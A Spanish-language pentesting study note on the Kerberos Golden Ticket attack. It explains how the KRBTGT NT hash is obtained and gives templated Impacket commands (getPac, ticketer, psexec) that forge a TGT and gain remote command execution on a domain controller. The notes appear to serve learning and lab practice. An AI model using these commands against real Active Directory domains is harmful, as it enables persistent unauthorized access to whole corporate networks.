------
- Tags: #toeria #practica #ataque 
-----
# [Golden Ticket Attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
### El ataque **Golden Ticket** es una técnica de explotación utilizada en entornos que emplean el protoclo de autenticación de [[Kerberos]]. Permite a un atacante generar y utilizar un TGT (Ticket Granting Ticket, token de autenticación que se utiliza para solicitar TGS), válido de forma indefinida, lo que le otorga acceso persistente y no autorizado a una red corportavia. Este ataque es muy peligroso y potencialmente devastador, ya que puede permitir al atacante acceder a recursos críticos de la red sin ser detectado durante un período prolongado de tiempo, a cualquier servicio como cualquier usuario.

----
# Explotación 

- ### **Recolección de Información**: El atacante comienza recopilando información crítica sobre la infraestructura de red del objetivo. Esto puede incluir la obtención del Hash NT de la cuenta **KRBTGT** en el Domain Controller, que es **esencial** para generar el Golden Ticket.

- ### **Obtención de Credenciales**: Para generar un Golden Ticket, el atacante debe obtener el **hash NT del KRBTGT** y otros datos sensibles del entorno. Esto puede lograrse mediante técnicas como el robo de credenciales a través de herramientas como **Mimikatz**.

- ### **Generación del Golden Ticket**: Con el hash NT del KRBTGT y otros datos recopilados, el atacante utiliza herramientas especializadas para crear un Golden Ticket. Este ticket forjado se firma criptográficamente y es prácticamente indistinguible de un TGT legítimo.

- ### **Persistencia**: El Golden Ticket generado por el atacante tiene una vida útil larga (generalmente 10 años) y se puede utilizar de manera persistente. Incluso si las contraseñas de los usuarios cambian, el Golden Ticket sigue siendo válido y permite al atacante acceder a recursos críticos durante un largo período de tiempo.

- ### **Acceso Ilimitado**: El Golden Ticket otorga al atacante acceso ilimitado a la red y a todos los recursos protegidos por el sistema de autenticación Kerberos. Esto incluye el acceso a servidores, sistemas de almacenamiento y cualquier recurso que utilice Kerberos para la autenticación.

-----
# PoC
### Por ejemplo, podemos estar en tenencia de el Hash NT de la cuenta de sistema **KRBTGT** el cual podemos utilizar para realizar un **Golden Ticket Attack**.
### En este caso, es crucial tener en cuenta que debemos enfrentarnos a un escenario en el cual tenemos que tener:
### **1)** El Hash NT del KRBTGT: Este puede ser obtenido del proceso **LSASS (Local Security Authority Subsystem Service)** o del archivo **NTDS.dit** (Base de datos que almacena datos de Active Directory, podría realizarse [[Abuso de SeBackupPrivilege]]) o incluso a raiz de un [[DCsync Attack]].
### **2)** Nombre de dominio completo. 
### **3)** El SID del Domain (Security Identifier): Identificador único y alfanumérico que se utiliza en los sistemas operativos Windows para identificar de manera única a usuarios, grupos y objetos de seguridad dentro de un dominio o una red.

### Teniendo en cuenta que el **TGT** de **caualquier usuario** puede ser creado en este ataque, podemos una vez más, al igual que en el [[Silver Ticket Attack]] hacer uso de las herramientas **impacket-getPac**, **impacket-ticketer** y **impacket-psexec**. 
### Obtener el **RID** del **Dominio**:

```bash
impacket-getPac -targetUser {username} -hashes :{nt_hash} {domain}/{username}
```
### Una vez que tengamos el SID del dominio, solo faltaría solicitar el **Golden Ticket** (TGT) con herramientas como **impacket-ticketer** o **ticketer.py**, es importante tener en cuenta que la ventaja de crear un **TGT** es que en a diferencia del TGS, este nos permite en cambio tener acceso a cualquier servicio o máquina en el dominio.

```bash
python3 ticketer.py -nthash {hash_nt} -domain-sid {sid} -domain {domain} {user} 

impacket-ticketer -nthash {hash_nt} -domain-sid {sid} -domain {domain} {user} 
```
### Una vez obtenido el ticket, como siempre solo hace falta exportarlo con la variable de entorno **KRB5CCNAME** y hacer uso de herramientas como **impacket-psexec** o **psexec.py** para la ejecución de acciones de manera remota.

```bash
export KRB5CCNAME={path/to/user.ccache/downloaded}

python3 psexec.py {dc}/{username}@{ip} -k -no-pass

impacket-psexec {dc}/{username}@{ip} -k -no-pass
```
### Obteniendo así, una vez más, la [[RCE - (Remote Command Execution)]].